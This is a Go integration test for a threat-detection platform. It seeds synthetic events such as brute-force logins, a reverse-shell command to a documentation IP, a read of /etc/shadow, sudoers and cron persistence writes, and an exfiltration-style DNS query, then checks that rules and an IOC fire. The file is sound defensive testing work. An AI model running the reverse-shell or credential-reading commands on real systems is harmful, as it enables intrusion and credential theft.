package main

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"testing"
	"time"

	_ "github.com/lib/pq"

	"detection-platform/internal/parse"
	"detection-platform/internal/rules"
)

const testRulesDir = "../../rules"

func TestDetectBatchRulesIOCsAndIdempotency(t *testing.T) {
	dsn := os.Getenv("TEST_DATABASE_URL")
	if dsn == "" {
		t.Skip("TEST_DATABASE_URL not set, skipping Postgres integration test")
	}
	db, err := sql.Open("postgres", dsn)
	if err != nil {
		t.Fatalf("open database: %v", err)
	}
	defer db.Close()
	if err := db.Ping(); err != nil {
		t.Fatalf("ping database: %v", err)
	}
	resetDetectorDB(t, db)

	loadedRules, err := rules.LoadRules(testRulesDir)
	if err != nil {
		t.Fatalf("load rules: %v", err)
	}
	base := time.Date(2026, 10, 20, 12, 0, 0, 0, time.UTC)

	for i := 0; i < 6; i++ {
		seedDetectorEvent(t, db, "auth.login_failure", base.Add(time.Duration(i)*10*time.Second),
			[]testEntity{{"src_ip", "ip", "198.51.100.23"}, {"user", "user", "admin"}}, nil)
	}
	seedDetectorEvent(t, db, "process.exec", base,
		[]testEntity{
			{"process", "process_image", "/bin/bash"},
			{"parent_process", "process_image", "/usr/sbin/apache2"},
			{"user", "user", "www-data"},
		},
		map[string]interface{}{"argv": []string{"bash", "-c", "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"}},
	)
	seedDetectorEvent(t, db, "process.exec", base,
		[]testEntity{{"process", "process_image", "/usr/sbin/useradd"}, {"user", "user", "root"}}, nil)
	seedDetectorEvent(t, db, "file.write", base,
		[]testEntity{{"process", "process_image", "/usr/bin/vim"}, {"user", "user", "root"}},
		map[string]interface{}{"path": "/etc/sudoers.d/svc-backup"},
	)
	seedDetectorEvent(t, db, "file.write", base,
		[]testEntity{{"process", "process_image", "/usr/bin/crontab"}, {"user", "user", "root"}},
		map[string]interface{}{"path": "/var/spool/cron/crontabs/svc-backup"},
	)
	seedDetectorEvent(t, db, "dns.query", base,
		[]testEntity{{"domain", "domain", "a1b2c3d4e5f607182930abcd.exfil-example.net"}}, nil)
	seedDetectorEvent(t, db, "file.read", base,
		[]testEntity{{"process", "process_image", "/bin/cat"}, {"user", "user", "www-data"}},
		map[string]interface{}{"path": "/etc/shadow"},
	)

	benignIDs := []int64{
		seedDetectorEvent(t, db, "auth.sudo", base,
			[]testEntity{{"user", "user", "ops"}},
			map[string]interface{}{"command": "/usr/bin/apt-get upgrade -y"},
		),
		seedDetectorEvent(t, db, "process.exec", base,
			[]testEntity{{"process", "process_image", "/usr/bin/restic"}, {"parent_process", "process_image", "/usr/sbin/cron"}},
			map[string]interface{}{"argv": []string{"restic", "backup", "/var/www"}},
		),
		seedDetectorEvent(t, db, "dns.query", base,
			[]testEntity{{"domain", "domain", "api.github.com"}}, nil,
		),
	}

	if _, err := db.ExecContext(context.Background(), `
		INSERT INTO iocs (ioc_type, value, source, confidence, context)
		VALUES ('domain', 'known-bad.example.org', 'test', 'high', 'integration fixture')
	`); err != nil {
		t.Fatalf("seed IOC: %v", err)
	}
	seedDetectorEvent(t, db, "dns.query", base,
		[]testEntity{{"domain", "domain", "known-bad.example.org"}}, nil)

	processed, alertCount, err := detectBatch(context.Background(), db, loadedRules, 1000)
	if err != nil {
		t.Fatalf("detectBatch: %v", err)
	}
	if processed == 0 || alertCount < 7 {
		t.Fatalf("processed %d events and raised %d alerts; want events and at least 7 rule/IOC alerts", processed, alertCount)
	}

	var ruleCount int
	if err := db.QueryRowContext(context.Background(), `SELECT count(DISTINCT rule_id) FROM alerts WHERE source = 'rule'`).Scan(&ruleCount); err != nil {
		t.Fatalf("count rule hits: %v", err)
	}
	if ruleCount != 6 {
		t.Errorf("distinct fired rules = %d, want all 6", ruleCount)
	}
	var bruteForceAlerts, evidenceCount int
	if err := db.QueryRowContext(context.Background(), `
		SELECT count(*), coalesce(max(jsonb_array_length(evidence_event_ids)), 0)
		FROM alerts WHERE rule_id = 'ssh-bruteforce-threshold'
	`).Scan(&bruteForceAlerts, &evidenceCount); err != nil {
		t.Fatalf("check brute-force aggregation: %v", err)
	}
	if bruteForceAlerts != 1 || evidenceCount != 6 {
		t.Errorf("brute-force alerts/evidence = %d/%d, want 1/6", bruteForceAlerts, evidenceCount)
	}
	for _, id := range benignIDs {
		var count int
		if err := db.QueryRowContext(context.Background(), `SELECT count(*) FROM alerts WHERE event_id = $1`, id).Scan(&count); err != nil {
			t.Fatalf("check benign event %d: %v", id, err)
		}
		if count != 0 {
			t.Errorf("benign event %d produced %d alerts", id, count)
		}
	}
	var iocCount int
	if err := db.QueryRowContext(context.Background(), `SELECT count(*) FROM alerts WHERE source = 'ioc'`).Scan(&iocCount); err != nil {
		t.Fatalf("count IOC alerts: %v", err)
	}
	if iocCount != 1 {
		t.Errorf("IOC alerts = %d, want 1", iocCount)
	}

	processedAgain, alertCountAgain, err := detectBatch(context.Background(), db, loadedRules, 1000)
	if err != nil {
		t.Fatalf("second detectBatch: %v", err)
	}
	if processedAgain != 0 || alertCountAgain != 0 {
		t.Errorf("second run processed/raised = %d/%d, want 0/0", processedAgain, alertCountAgain)
	}
}

func resetDetectorDB(t *testing.T, db *sql.DB) {
	t.Helper()
	for _, statement := range []string{
		`TRUNCATE alerts, events, entities, parse_failures, iocs, raw_events RESTART IDENTITY CASCADE`,
		`UPDATE alert_cursor SET last_event_id = 0 WHERE id = 1`,
		`UPDATE normalizer_cursor SET last_raw_event_id = 0 WHERE id = 1`,
	} {
		if _, err := db.ExecContext(context.Background(), statement); err != nil {
			t.Fatalf("reset database: %v (%s)", err, statement)
		}
	}
}

type testEntity struct {
	role       string
	entityType string
	value      string
}

func seedDetectorEvent(t *testing.T, db *sql.DB, eventType string, eventTime time.Time, entities []testEntity, fields map[string]interface{}) int64 {
	t.Helper()
	ctx := context.Background()
	var rawID int64
	if err := db.QueryRowContext(ctx, `
		INSERT INTO raw_events (source, host, kafka_topic, kafka_partition, kafka_offset, raw_line)
		VALUES ('test', 'lab-host-1', 'phase3-test', 0, nextval('raw_events_id_seq'), 'synthetic')
		RETURNING id
	`).Scan(&rawID); err != nil {
		t.Fatalf("insert raw test event: %v", err)
	}

	columns := map[string]string{
		"user": "user_entity", "process": "process_entity", "parent_process": "parent_process_entity",
		"src_ip": "src_ip_entity", "domain": "domain_entity",
	}
	entityIDs := make(map[string]string)
	for _, entity := range entities {
		id := parse.EntityID(entity.entityType, entity.value)
		if _, err := db.ExecContext(ctx, `
			INSERT INTO entities (id, entity_type, value, first_seen, last_seen)
			VALUES ($1, $2, $3, $4, $4)
			ON CONFLICT (id) DO UPDATE SET last_seen = EXCLUDED.last_seen
		`, id, entity.entityType, entity.value, eventTime); err != nil {
			t.Fatalf("insert entity: %v", err)
		}
		entityIDs[columns[entity.role]] = id
	}

	fieldsJSON, err := json.Marshal(fields)
	if err != nil {
		t.Fatalf("marshal fields: %v", err)
	}
	if len(fieldsJSON) == 0 || string(fieldsJSON) == "null" {
		fieldsJSON = []byte("{}")
	}
	dedupKey := fmt.Sprintf("phase3-test-%d-%s-%d", eventTime.UnixNano(), eventType, rawID)
	var eventID int64
	err = db.QueryRowContext(ctx, `
		INSERT INTO events (
			raw_event_id, event_time, source, host, event_type, user_entity, process_entity,
			parent_process_entity, src_ip_entity, domain_entity, fields, dedup_key
		) VALUES ($1, $2, 'test', 'lab-host-1', $3, $4, $5, $6, $7, $8, $9, $10)
		RETURNING id
	`, rawID, eventTime, eventType,
		nullableEntity(entityIDs["user_entity"]), nullableEntity(entityIDs["process_entity"]),
		nullableEntity(entityIDs["parent_process_entity"]), nullableEntity(entityIDs["src_ip_entity"]),
		nullableEntity(entityIDs["domain_entity"]), string(fieldsJSON), dedupKey,
	).Scan(&eventID)
	if err != nil {
		t.Fatalf("insert normalized test event: %v", err)
	}
	return eventID
}

func nullableEntity(value string) interface{} {
	if value == "" {
		return nil
	}
	return value
}
